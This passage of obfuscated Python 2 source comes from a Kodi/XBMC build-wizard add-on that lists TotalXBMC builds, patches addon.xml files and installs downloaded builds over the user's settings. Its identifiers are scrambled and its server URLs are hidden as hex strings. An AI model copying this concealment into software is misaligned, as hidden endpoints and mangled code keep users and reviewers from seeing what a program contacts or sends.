 o0oO ( 'folder' , 'Documentary' , str ( url ) + '&genre=documentary' , 'grab_builds' , 'documentary.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Downloads' , str ( url ) + '&genre=downloads' , 'grab_builds' , 'downloads.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Food' , str ( url ) + '&genre=food' , 'grab_builds' , 'food.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Gaming' , str ( url ) + '&genre=gaming' , 'grab_builds' , 'gaming.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Health' , str ( url ) + '&genre=health' , 'grab_builds' , 'health.png' , '' , '' , '' )
 o0oO ( 'folder' , 'How To...' , str ( url ) + '&genre=howto' , 'grab_builds' , 'howto.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Kids' , str ( url ) + '&genre=kids' , 'grab_builds' , 'kids.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Live TV' , str ( url ) + '&genre=livetv' , 'grab_builds' , 'livetv.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Movies' , str ( url ) + '&genre=movies' , 'grab_builds' , 'movies.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Music' , str ( url ) + '&genre=music' , 'grab_builds' , 'music.png' , '' , '' , '' )
 o0oO ( 'folder' , 'News' , str ( url ) + '&genre=news' , 'grab_builds' , 'news.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Photos' , str ( url ) + '&genre=photos' , 'grab_builds' , 'photos.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Podcasts' , str ( url ) + '&genre=podcasts' , 'grab_builds' , 'podcasts.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Radio' , str ( url ) + '&genre=radio' , 'grab_builds' , 'radio.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Religion' , str ( url ) + '&genre=religion' , 'grab_builds' , 'religion.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Space' , str ( url ) + '&genre=space' , 'grab_builds' , 'space.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Sports' , str ( url ) + '&genre=sports' , 'grab_builds' , 'sports.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Technology' , str ( url ) + '&genre=tech' , 'grab_builds' , 'tech.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Trailers' , str ( url ) + '&genre=trailers' , 'grab_builds' , 'trailers.png' , '' , '' , '' )
 o0oO ( 'folder' , 'TV Shows' , str ( url ) + '&genre=tv' , 'grab_builds' , 'tv.png' , '' , '' , '' )
 o0oO ( 'folder' , 'Misc.' , str ( url ) + '&genre=other' , 'grab_builds' , 'other.png' , '' , '' , '' )
 if ii . getSetting ( 'adult' ) == 'true' :
  o0oO ( 'folder' , 'XXX' , str ( url ) + '&genre=adult' , 'grab_builds' , 'adult.png' , '' , '' , '' )
  if 84 - 84: IIiII % iiiIi1i1I
def IIiIi1iI1iII ( ) :
 OoOo00o = datetime . datetime . now ( )
 IIi = time . mktime ( OoOo00o . timetuple ( ) ) + ( OoOo00o . microsecond / 1000000. )
 OoO00O0OOO = str ( '%f' % IIi )
 OoO00O0OOO = OoO00O0OOO . replace ( '.' , '' )
 OoO00O0OOO = OoO00O0OOO [ : - 3 ]
 return OoO00O0OOO
 if 87 - 87: O0OoO
def II11iIII1i1I ( default = "" , heading = "" , hidden = False ) :
 ii1I11i = xbmc . Keyboard ( default , heading , hidden )
 if 89 - 89: OO . O0OoO % O000OO0 . O000OO0 - iiIi
 ii1I11i . doModal ( )
 if ( ii1I11i . isConfirmed ( ) ) :
  return unicode ( ii1I11i . getText ( ) , "utf-8" )
 return default
 if 56 - 56: IIiII
 if 21 - 21: i1iiI11I / OO + OOO00O - IIiII / O000OO0 / II11iII
def oOI11 ( ) :
 o0000o0Oo = [ ]
 ooo0O0OOo0OoO = sys . argv [ 2 ]
 if len ( ooo0O0OOo0OoO ) >= 2 :
  Ii1i1 = sys . argv [ 2 ]
  oOoO00i1i = Ii1i1 . replace ( '?' , '' )
  if ( Ii1i1 [ len ( Ii1i1 ) - 1 ] == '/' ) :
   Ii1i1 = Ii1i1 [ 0 : len ( Ii1i1 ) - 2 ]
  i1iIIi11i111I = oOoO00i1i . split ( '&' )
  o0000o0Oo = { }
  for iiiIii in range ( len ( i1iIIi11i111I ) ) :
   iii1IIiI = { }
   iii1IIiI = i1iIIi11i111I [ iiiIii ] . split ( '=' )
   if ( len ( iii1IIiI ) ) == 2 :
    o0000o0Oo [ iii1IIiI [ 0 ] ] = iii1IIiI [ 1 ]
    if 33 - 33: IIiII
 return o0000o0Oo
 if 98 - 98: OooOooo % II11iII
def OoO0O000 ( ) :
 IIIiIiI11iIi = xbmc . translatePath ( os . path . join ( 'special://home' , 'addons' ) )
 o0OOO = xbmcgui . DialogProgress ( )
 o0OOO . create ( "Gotham Addon Fix" , "Please wait whilst your addons" , '' , 'are being made Gotham compatible.' )
 for I1IiIIi11I1 in glob . glob ( os . path . join ( IIIiIiI11iIi , '*.*' ) ) :
  for file in glob . glob ( os . path . join ( I1IiIIi11I1 , '*.*' ) ) :
   if 'addon.xml' in file :
    o0OOO . update ( 0 , "Fixing" , file , 'Please Wait' )
    iIIiiIIIi1I = open ( file ) . read ( )
    ooooO0O = iIIiiIIIi1I . replace ( 'addon="xbmc.python" version="1.0"' , 'addon="xbmc.python" version="2.1.0"' ) . replace ( 'addon="xbmc.python" version="2.0"' , 'addon="xbmc.python" version="2.1.0"' )
    Ii = open ( file , mode = 'w' )
    Ii . write ( str ( ooooO0O ) )
    Ii . close ( )
    if 14 - 14: I11iii1Ii / I11iii1Ii * III1i1i . o0OOOoO0
 I1IiI = xbmcgui . Dialog ( )
 I1IiI . ok ( "Your addons have now been made compatible" , "If you still find you have addons that aren't working please run the addon so it throws up a script error, upload a log and post details on the forum at [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B] so the team can look into it. Thank you." )
 if 59 - 59: II11iII * oO00OO0oo0
 if 54 - 54: III1i1i % iiIi - OoOo
def OOo0OOoO00o0 ( ) :
 I1IiI = xbmcgui . Dialog ( )
 Ii11I1iIiiI = xbmcgui . Dialog ( ) . yesno ( 'Convert Addons To Gotham' , 'This will edit your addon.xml files so they show as Gotham compatible. It\'s doubtful this will have any effect on whether or not they work but it will get rid of the annoying incompatible pop-up message. Do you wish to continue?' )
 if Ii11I1iIiiI == 0 :
  return
 elif Ii11I1iIiiI == 1 :
  OoO0O000 ( )
  if 87 - 87: OOO00O . III1i1i % OO + i1i1i11IIi + iIi1iIiii111 % i1iiI11I
  if 19 - 19: oO00OO0oo0 - iIIi1iIIi % OoOo
def ooIII1II1iii1i ( url ) :
 global iIi1ii1I1
 if ii . getSetting ( 'adult' ) == 'true' :
  II1IIIii = 'yes'
 else :
  II1IIIii = 'no'
 O0OO0oOO = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4164646f6e506f7274616c2f736f727462792e7068703f736f7274783d6e616d6526757365723d2573266164756c743d2573262573'
 ooooO = binascii . unhexlify ( O0OO0oOO ) % ( o0OoOoOO00 , II1IIIii , url )
 iiIiI = o00oooO0Oo ( ooooO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)" <br> downloads="(.+?)" <br> icon="(.+?)" <br> broken="(.+?)" <br> UID="(.+?)" <br>' , re . DOTALL ) . findall ( iiIiI )
 oO0O0 ( ooooO , 'addons' )
 for i1II1 , I1i11 , oO00oOooooo0 , o0OOo0o0O0O , iI111i11iI1 in ooo0O :
  if o0OOo0o0O0O == '0' :
   o0oO ( 'folder2' , i1II1 + '[COLOR=lime] [' + I1i11 + ' downloads][/COLOR]' , iI111i11iI1 , 'addon_final_menu' , oO00oOooooo0 , '' , '' )
  if o0OOo0o0O0O == '1' :
   o0oO ( 'folder2' , '[COLOR=red]' + i1II1 + ' [REPORTED AS BROKEN][/COLOR]' , iI111i11iI1 , 'addon_final_menu' , oO00oOooooo0 , '' , '' )
   if 2 - 2: OooOooo + OO + iiIi . iiiIi1i1I
   if 19 - 19: iIIi1iIIi - O00oo0OO0oOOO - iIi1iIiii111 - OooOooo . iIIi1iIIi . OO
def i11I1I ( url ) :
 if zip == '' :
  I1IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'You have not set your backup storage folder.\nPlease update the addon settings and try again.' , '' , '' )
  ii . openSettings ( sys . argv [ 0 ] )
 if ii . getSetting ( 'adult' ) == 'true' :
  II1IIIii = ''
 else :
  II1IIIii = 'no'
 oo0ooooo00o = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f436f6d6d756e6974795f4275696c64732f736f727462792e7068703f736f7274783d6e616d65266f72646572783d415343266164756c743d2573262573'
 ooooO = binascii . unhexlify ( oo0ooooo00o ) % ( II1IIIii , url )
 iiIiI = o00oooO0Oo ( ooooO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> Thumbnail="(.+?)" <br> Fanart="(.+?)" <br> downloads="(.+?)" <br> <br>' , re . DOTALL ) . findall ( iiIiI )
 oO0O0 ( url , 'communitybuilds' )
 for i1II1 , id , OoOoi111i1iIi1 , OoO0oO , I1i11 in ooo0O :
  IiI1 ( i1II1 + '[COLOR=lime] (' + I1i11 + ' downloads)[/COLOR]' , id + url , 'community_menu' , OoOoi111i1iIi1 , OoO0oO , id , '' , '' , '' , '' )
  if 10 - 10: iiiIi1i1I . II11iII / O00oo0OO0oOOO * OOO00O
  if 10 - 10: IIiII - O000OO0
def ooOOooo0ooo00 ( url ) :
 oooOo = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4861726477617265506f7274616c2f736f727462792e7068703f736f7274783d4164646564266f72646572783d44455343262573'
 ooooO = binascii . unhexlify ( oooOo ) % ( url )
 iiIiI = o00oooO0Oo ( ooooO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)" <br> id="(.+?)" <br> thumb="(.+?)" <br><br>' , re . DOTALL ) . findall ( iiIiI )
 oO0O0 ( ooooO , 'hardware' )
 for i1II1 , id , oo0oo0O0 in ooo0O :
  o0oO ( 'folder2' , i1II1 , id , 'hardware_final_menu' , oo0oo0O0 , '' , '' )
  if 18 - 18: i1iiI11I + OO0O + i1iiI11I . i1i1i11IIi + OO . OOO00O
  if 7 - 7: i1i1i11IIi + i1iiI11I * IIiII * IIiII / II11iII - iIi1iIiii111
def oOOOo0o ( url ) :
 iiiii11I1 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4c61746573744e6577732f736f727462792e7068703f736f7274783d6974656d5f64617465266f72646572783d44455343262573'
 ooooO = binascii . unhexlify ( iiiii11I1 ) % ( url )
 iiIiI = o00oooO0Oo ( ooooO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)" <br> date="(.+?)" <br> source="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( iiIiI )
 for i1II1 , Ii1 , OOOo , id in ooo0O :
  if "OpenELEC" in OOOo :
   o0oO ( '' , i1II1 + '  (' + Ii1 + ')' , id , 'news_menu' , 'OpenELEC.png' , '' , '' )
  if "Official" in OOOo :
   o0oO ( '' , i1II1 + '  (' + Ii1 + ')' , id , 'news_menu' , 'XBMC.png' , '' , '' )
  if "Raspbmc" in OOOo :
   o0oO ( '' , i1II1 + '  (' + Ii1 + ')' , id , 'news_menu' , 'Raspbmc.png' , '' , '' )
  if "XBMC4Xbox" in OOOo :
   o0oO ( '' , i1II1 + '  (' + Ii1 + ')' , id , 'news_menu' , 'XBMC4Xbox.png' , '' , '' )
  if "TotalXBMC" in OOOo :
   o0oO ( '' , i1II1 + '  (' + Ii1 + ')' , id , 'news_menu' , 'TOTALXBMC.png' , '' , '' )
   if 35 - 35: OOO00O - I11iii1Ii . O000OO0 * O000OO0 / oO00OO0oo0 + i1i1i11IIi
   if 87 - 87: OooOooo % i1iiI11I
def o0OO0OOO0O ( url ) :
 Iii1I = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f5475746f7269616c506f7274616c2f736f727462792e7068703f736f7274783d4e616d65266f72646572783d415343262573'
 ooooO = binascii . unhexlify ( Iii1I ) % ( url )
 iiIiI = o00oooO0Oo ( ooooO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 ooo0O = re . compile ( 'name="(.+?)" <br> about="(.+?)" <br> id="(.+?)" <br><br>' , re . DOTALL ) . findall ( iiIiI )
 oO0O0 ( ooooO , 'tutorials' )
 for i1II1 , oOoOOOOoOO0o , id in ooo0O :
  o0oO ( 'folder' , i1II1 , id , 'tutorial_final_menu' , 'TotalXBMC_Guides.png' , '' , oOoOOOOoOO0o )
  if 31 - 31: OoOo . O0OoO + i1i1i11IIi
  if 91 - 91: i1i1i11IIi % OOO00O
def i1i1II1I ( url , local ) :
 iiii1I1 ( )
 OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( i1II1 , 'This will over-write your existing guisettings.xml.' , 'Are you sure this is the build you have installed?' , '' , nolabel = 'No, Cancel' , yeslabel = 'Yes, Fix' )
 if OO0OO0OO == 0 :
  return
 elif OO0OO0OO == 1 :
  OoooO0o ( url , local )
  if 62 - 62: OooOooo + iIi1iIiii111 * iIIi1iIIi
  if 54 - 54: OOO00O . I11iii1Ii
def OoooO0o ( url , local ) :
 print "Local: " + str ( local )
 I1i = False
 iIi1Ii1IIiI = 0
 ooo00Oo00O0 = 1
 if os . path . exists ( ooOoOoo0O ) :
  os . remove ( ooOoOoo0O )
 if os . path . exists ( oOOoo00O0O ) :
  os . remove ( oOOoo00O0O )
 if os . path . exists ( oO0o0o0ooO0oO ) :
  os . remove ( oO0o0o0ooO0oO )
 if not os . path . exists ( OooO0 ) :
  os . makedirs ( OooO0 )
 o0OOO . create ( "Downloading Skin Fix" , "Downloading guisettings.xml" , '' , 'Please Wait' )
 shutil . copyfile ( i1 , ooOoOoo0O )
 if local != 1 :
  OOOOOOoo0oO = os . path . join ( i1iiIIiiI111 , 'guifix.zip' )
  downloader . download ( url , OOOOOOoo0oO , o0OOO )
 else :
  OOOOOOoo0oO = xbmc . translatePath ( url )
 IiIiIIiii1I ( OOOOOOoo0oO )
 o0OOO . create ( "Installing Skin Fix" , "Checking " , '' , 'Please Wait' )
 o0OOO . update ( 0 , "" , "Extracting Zip Please Wait" )
 I1iii11 ( OOOOOOoo0oO , OooO0 , o0OOO )
 if local != 'library' or local != 'fresh' :
  try :
   ooooo0Oo0 = open ( OooO0 + 'profiles.xml' , mode = 'r' )
   o0I1IIIi11ii11 = ooooo0Oo0 . read ( )
   ooooo0Oo0 . close ( )
   if os . path . exists ( OooO0 + 'profiles.xml' ) :
    if local == None :
     OO0OO0OO = xbmcgui . Dialog ( ) . yesno ( "PROFILES DETECTED" , 'This build has profiles included, would you like to overwrite' , 'your existing profiles or keep the ones you have?' , '' , nolabel = 'Keep my profiles' , yeslabel = 'Use new profiles' )
    if local != None :
     OO0OO0OO = 1
    if OO0OO0OO == 1 :
     O0o0oo0oOO0oO = open ( oO0o0o0ooO0oO , mode = 'w' )
     time . sleep ( 1 )
     O0o0oo0oOO0oO . write ( o0I1IIIi11ii11 )
     time . sleep ( 1 )
     O0o0oo0oOO0oO . close ( )
     ooo00Oo00O0 = 0
  except : print "no profiles.xml file"
 os . rename ( OooO0 + 'guisettings.xml' , oOOoo00O0O )
 if local != 'fresh' :
  iIiIII1iI1111 = I1IiI . yesno ( "Do You Want To Keep Your Kodi Settings?" , 'Would you like to keep your existing Kodi settings or' , 'would you rather wipe and install the ones created by the' , 'build author?' , nolabel = 'Keep my settings' , yeslabel = 'Replace my settings' )
 if local == 'fresh' : iIiIII1iI1111 = 1
 if iIiIII1iI1111 == 1 :
  if os . path . exists ( i1 ) :
   try :
    print "Attempting to remove guisettings"
    os . remove ( i1 )
    I1i = True
   except :
    print "Problem removing guisettings"
    I1i = False
   try :
    print "Attempting to replace guisettings with new"
    os . rename ( oOOoo00O0O , i1 )
    I1i = True
   except :
    print "Failed to replace guisettings with new"
    I1i = False
 if iIiIII1iI1111 == 0 :
  if 37 - 37: oO00OO0oo0 % o0OOOoO0 * OO0O * OO0O * iIi1iIiii111
  oOooO00o0O = open ( ooOoOoo0O , mode = 'r' )
  OOo0 = file . read ( oOooO00o0O )
  file . close ( oOooO00o0O )
  I1I1iO0O0oo = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( OOo0 )
  o00O = I1I1iO0O0oo [ 0 ] if ( len ( I1I1iO0O0oo ) > 0 ) else ''
  Oo000O = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( OOo0 )
  I1111III11 = Oo000O [ 0 ] if ( len ( Oo000O ) > 0 ) else ''
  iIOOO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( OOo0 )
  iI1 = iIOOO [ 0 ] if ( len ( iIOOO ) > 0 ) else ''
  O00oO0o000oO = open ( oOOoo00O0O , mode = 'r' )
  I1i11II11i1iI = file . read ( O00oO0o000oO )
  file . close ( O00oO0o000oO )
  iI1I1I1i1i = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( I1i11II11i1iI )
  OOo0O = iI1I1I1i1i [ 0 ] if ( len ( iI1I1I1i1i ) > 0 ) else ''
  oOOoooO0O0 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( I1i11II11i1iI )
  ii1O0ooooo000 = oOOoooO0O0 [ 0 ] if ( len ( oOOoooO0O0 ) > 0 ) else ''
  OooOoOO0OO = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( I1i11II11i1iI )
  I1iiIiiii1111 = OooOoOO0OO [ 0 ] if ( len ( OooOoOO0OO ) > 0 ) else ''
  I1ii1i11i = OOo0 . replace ( o00O , OOo0O ) . replace ( iI1 , I1iiIiiii1111 ) . replace ( I1111III11 , ii1O0ooooo000 )
  O0o0oo0oOO0oO = open ( ooOoOoo0O , mode = 'w+' )
  O0o0oo0oOO0oO . write ( str ( I1ii1i11i ) )
  O0o0oo0oOO0oO . close ( )
  if os . path . exists ( i1 ) :
   try :
    os . remove ( i1 )
    I1i = True
   except :
    I1i = False
  try :
   os . rename ( ooOoOoo0O , i1 )
   os . remove ( oOOoo00O0O )
   I1i = True
  except :
   I1i = False
 if I1i == True or local == None :
  try :
   oOooO00o0O = open ( ii11iIi1I , mode = 'r' )
   OOo0 = file . read ( oOooO00o0O )
   file . close ( oOooO00o0O )
   print "Content: " + OOo0
   Oooooo0O00o = re . compile ( 'id="(.+?)"' ) . findall ( OOo0 )
   II11ii1 = Oooooo0O00o [ 0 ] if ( len ( Oooooo0O00o ) > 0 ) else ''
   ii1II1II = re . compile ( 'name="(.+?)"' ) . findall ( OOo0 )
   i11i11II11i = ii1II1II [ 0 ] if ( len ( ii1II1II ) > 0 ) else ''
   II1Ii1I1i = re . compile ( 'version="(.+?)"' ) . findall ( OOo0 )
   iIiI = II1Ii1I1i [ 0 ] if ( len ( II1Ii1I1i ) > 0 ) else ''
   O0o0oo0oOO0oO = open ( iI111I11I1I1 , mode = 'w+' )
   O0o0oo0oOO0oO . write ( 'id="' + str ( II11ii1 ) + '"\nname="' + i11i11II11i + '"\nversion="' + iIiI + '"' )
   O0o0oo0oOO0oO . close ( )
   oOooO00o0O = open ( i1iIIi1 , mode = 'r' )
   OOo0 = file . read ( oOooO00o0O )
   file . close ( oOooO00o0O )
   OOooOooo0OOo0 = re . compile ( 'version="(.+?)"' ) . findall ( OOo0 )
   oo0o0OoOO0o0 = OOooOooo0OOo0 [ 0 ] if ( len ( OOooOooo0OOo0 ) > 0 ) else ''
   I1ii1i11i = OOo0 . replace ( oo0o0OoOO0o0 , iIiI )
   O0o0oo0oOO0oO = open ( i1iIIi1 , mode = 'w' )
   O0o0oo0oOO0oO . write ( str ( I1ii1i11i ) )
   O0o0oo0oOO0oO . close ( )
   os . remove ( ii11iIi1I )
  except :
   O0o0oo0oOO0oO = open ( iI111I11I1I1 , mode = 'w+' )
   O0o0oo0oOO0oO . write ( 'id="None"\nname="Unknown"\nversion="Unknown"' )
   O0o0oo0oOO0oO . close ( )
 if os . path . exists ( OooO0 + 'profiles.xml' ) :
  os . remove ( OooO0 + 'profiles.xml' )
  time . sleep ( 1 )
 if os . path . exists ( OooO0 ) :
  os . removedirs ( OooO0 )
 III1III11II = xbmc . translatePath ( os . path . join ( i1i1II , oo000 , 'notification.txt' ) )
 if os . path . exists ( III1III11II ) :
  os . remove ( III1III11II )
  if 43 - 43: OoOo
 if I1i == True :
  if 47 - 47: iiIi % OooOooo
  if 63 - 63: I11iii1Ii / OooOooo * i1iiI11I . OO
  if 85 - 85: oO00OO0oo0 / oO00OO0oo0 . I11iii1Ii . III1i1i
  OooOo ( )
  I1IiI . ok ( "Force Close Required" , "If you\'re seeing this message it means the force" , "close was unsuccessful. Please close XBMC/Kodi via your" , "operating system or pull the power." )
  if 67 - 67: O000OO0 / III1i1i
  if 88 - 88: OooOooo - OO0O
  if 63 - 63: O0OoO * iiIi
  if 19 - 19: O0OoO - O00oo0OO0oOOO . i1iiI11I . OooOooo / OO0O
  if 87 - 87: OooOooo - OOO00O - OO0O + O000OO0 % i1iiI11I / oO00OO0oo0
  if 12 - 12: OOO00O
  if 86 - 86: o0OOOoO0 - I11iii1Ii
  if 63 - 63: OoOo / OooOooo + iiIi . IIiII . OOO00O
def IiI1iiI11 ( url ) :
 OOoOOOO00 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f4861726477617265506f7274616c2f686172647761726564657461696c732e7068703f69643d2573'
 IIII = binascii . unhexlify ( OOoOOOO00 ) % ( url )
 iiIiI = o00oooO0Oo ( IIII ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 o0O0OOO0Ooo = re . compile ( 'name="(.+?)"' ) . findall ( iiIiI )
 IIii1III = re . compile ( 'manufacturer="(.+?)"' ) . findall ( iiIiI )
 I1 = re . compile ( 'video_guide1="(.+?)"' ) . findall ( iiIiI )
 IIiI = re . compile ( 'video_guide2="(.+?)"' ) . findall ( iiIiI )
 O0oOOo0o = re . compile ( 'video_guide3="(.+?)"' ) . findall ( iiIiI )
 I1III11iiii11i1 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( iiIiI )
 ooOo0OoO = re . compile ( 'video_guide5="(.+?)"' ) . findall ( iiIiI )
 i1iiIIi1I = re . compile ( 'video_label1="(.+?)"' ) . findall ( iiIiI )
 iiI1I1IIi11i1 = re . compile ( 'video_label2="(.+?)"' ) . findall ( iiIiI )
 i1II1iii1i = re . compile ( 'video_label3="(.+?)"' ) . findall ( iiIiI )
 OOO0o = re . compile ( 'video_label4="(.+?)"' ) . findall ( iiIiI )
 iII = re . compile ( 'video_label5="(.+?)"' ) . findall ( iiIiI )
 ooooOoo0OO = re . compile ( 'shops="(.+?)"' ) . findall ( iiIiI )
 Oo00O0Oo0Oo = re . compile ( 'description="(.+?)"' ) . findall ( iiIiI )
 Oo0O0000Oo00o = re . compile ( 'screenshot1="(.+?)"' ) . findall ( iiIiI )
 II1ii = re . compile ( 'screenshot2="(.+?)"' ) . findall ( iiIiI )
 o00iIiiiII = re . compile ( 'screenshot3="(.+?)"' ) . findall ( iiIiI )
 Ii1I1 = re . compile ( 'screenshot4="(.+?)"' ) . findall ( iiIiI )
 OO0ooO0 = re . compile ( 'screenshot5="(.+?)"' ) . findall ( iiIiI )
 OoOooOO0oOOo0O = re . compile ( 'screenshot6="(.+?)"' ) . findall ( iiIiI )
 I1II = re . compile ( 'screenshot7="(.+?)"' ) . findall ( iiIiI )
 iIIi1Ii1III = re . compile ( 'screenshot8="(.+?)"' ) . findall ( iiIiI )
 Oooo00 = re . compile ( 'screenshot9="(.+?)"' ) . findall ( iiIiI )
 iii1II1iI1IIi = re . compile ( 'screenshot10="(.+?)"' ) . findall ( iiIiI )
 Ii11iiI1 = re . compile ( 'screenshot11="(.+?)"' ) . findall ( iiIiI )
 oO0O = re . compile ( 'screenshot12="(.+?)"' ) . findall ( iiIiI )
 OOoooO00o0o = re . compile ( 'screenshot13="(.+?)"' ) . findall ( iiIiI )
 I1ii1Ii1 = re . compile ( 'screenshot14="(.+?)"' ) . findall ( iiIiI )
 OoO = re . compile ( 'added="(.+?)"' ) . findall ( iiIiI )
 oOO0O00oO0Ooo = re . compile ( 'platform="(.+?)"' ) . findall ( iiIiI )
 oOiI111I1III = re . compile ( 'chipset="(.+?)"' ) . findall ( iiIiI )
 i111IiiI1Ii = re . compile ( 'official_guide="(.+?)"' ) . findall ( iiIiI )
 OooOOOOOo = re . compile ( 'official_preview="(.+?)"' ) . findall ( iiIiI )
 i1I11ii = re . compile ( 'thumbnail="(.+?)"' ) . findall ( iiIiI )
 o0ooO00O0O = re . compile ( 'stock_rom="(.+?)"' ) . findall ( iiIiI )
 iiiI1iI1 = re . compile ( 'CPU="(.+?)"' ) . findall ( iiIiI )
 I1oOoO0OOO00O = re . compile ( 'GPU="(.+?)"' ) . findall ( iiIiI )
 OOOOO0o0OOo = re . compile ( 'RAM="(.+?)"' ) . findall ( iiIiI )
 I11I11I11IiIi = re . compile ( 'flash="(.+?)"' ) . findall ( iiIiI )
 OOii1ii1i11I1I = re . compile ( 'wifi="(.+?)"' ) . findall ( iiIiI )
 iiII1iiiiiii = re . compile ( 'bluetooth="(.+?)"' ) . findall ( iiIiI )
 iiIiii = re . compile ( 'LAN="(.+?)"' ) . findall ( iiIiI )
 iiI1ii = re . compile ( 'xbmc_version="(.+?)"' ) . findall ( iiIiI )
 O0OooOO = re . compile ( 'pros="(.+?)"' ) . findall ( iiIiI )
 i1i1 = re . compile ( 'cons="(.+?)"' ) . findall ( iiIiI )
 o0oOoOo0 = re . compile ( 'library_scan="(.+?)"' ) . findall ( iiIiI )
 III1IiI1i1i = re . compile ( '4k="(.+?)"' ) . findall ( iiIiI )
 o0OOOOOo0 = re . compile ( '1080="(.+?)"' ) . findall ( iiIiI )
 oooOoO = re . compile ( '720="(.+?)"' ) . findall ( iiIiI )
 O0Oo0 = re . compile ( '3D="(.+?)"' ) . findall ( iiIiI )
 iIIIi1IiI11I1 = re . compile ( 'DTS="(.+?)"' ) . findall ( iiIiI )
 O0Ooo000 = re . compile ( 'BootTime="(.+?)"' ) . findall ( iiIiI )
 IIi11iI1Iii = re . compile ( 'CopyFiles="(.+?)"' ) . findall ( iiIiI )
 IiIi1i = re . compile ( 'CopyVideo="(.+?)"' ) . findall ( iiIiI )
 i11ii = re . compile ( 'EthernetTest="(.+?)"' ) . findall ( iiIiI )
 oOOOOO0Ooooo = re . compile ( 'Slideshow="(.+?)"' ) . findall ( iiIiI )
 o0o000Oo = re . compile ( 'total_review="(.+?)"' ) . findall ( iiIiI )
 oO0o0O0o0OO00 = re . compile ( 'whufclee_review="(.+?)"' ) . findall ( iiIiI )
 iIiiiIi = re . compile ( 'CB_Premium="(.+?)"' ) . findall ( iiIiI )
 if 74 - 74: III1i1i + iiIi / o0OOOoO0 / OooOooo . i1i1i11IIi % o0OOOoO0
 i1II1 = o0O0OOO0Ooo [ 0 ] if ( len ( o0O0OOO0Ooo ) > 0 ) else ''
 iiIi11I1IIiiii = IIii1III [ 0 ] if ( len ( IIii1III ) > 0 ) else ''
 i1II1I1Iii1 = I1 [ 0 ] if ( len ( I1 ) > 0 ) else 'None'
 iiI11Iii = IIiI [ 0 ] if ( len ( IIiI ) > 0 ) else 'None'
 O0o0O0 = O0oOOo0o [ 0 ] if ( len ( O0oOOo0o ) > 0 ) else 'None'
 Ii1II1I11i1 = I1III11iiii11i1 [ 0 ] if ( len ( I1III11iiii11i1 ) > 0 ) else 'None'
 oOoooooOoO = ooOo0OoO [ 0 ] if ( len ( ooOo0OoO ) > 0 ) else 'None'
 IIIII1 = i1iiIIi1I [ 0 ] if ( len ( i1iiIIi1I ) > 0 ) else 'None'
 iIi1Ii1i1iI = iiI1I1IIi11i1 [ 0 ] if ( len ( iiI1I1IIi11i1 ) > 0 ) else 'None'
 IIiI1 = i1II1iii1i [ 0 ] if ( len ( i1II1iii1i ) > 0 ) else 'None'
 i1iI1 = OOO0o [ 0 ] if ( len ( OOO0o ) > 0 ) else 'None'
 ii1I1IiiI1ii1i = iII [ 0 ] if ( len ( iII ) > 0 ) else 'None'
 o0OI1 = ooooOoo0OO [ 0 ] if ( len ( ooooOoo0OO ) > 0 ) else ''
 iIIII1iIIii = Oo00O0Oo0Oo [ 0 ] if ( len ( Oo00O0Oo0Oo ) > 0 ) else ''
 oo0oOO = Oo0O0000Oo00o [ 0 ] if ( len ( Oo0O0000Oo00o ) > 0 ) else ''
 i1II11IiiiI = II1ii [ 0 ] if ( len ( II1ii ) > 0 ) else ''
 IIIi = o00iIiiiII [ 0 ] if ( len ( o00iIiiiII ) > 0 ) else ''
 Ii1iiI1 = Ii1I1 [ 0 ] if ( len ( Ii1I1 ) > 0 ) else ''
 o0ooOOoO0oO0 = OO0ooO0 [ 0 ] if ( len ( OO0ooO0 ) > 0 ) else ''
 oo00I1IiI1IIiI = OoOooOO0oOOo0O [ 0 ] if ( len ( OoOooOO0oOOo0O ) > 0 ) else ''
 ooooo0o0oo0Ooo = I1II [ 0 ] if ( len ( I1II ) > 0 ) else ''
 iI1i = iIIi1Ii1III [ 0 ] if ( len ( iIIi1Ii1III ) > 0 ) else ''
 i11I = Oooo00 [ 0 ] if ( len ( Oooo00 ) > 0 ) else ''
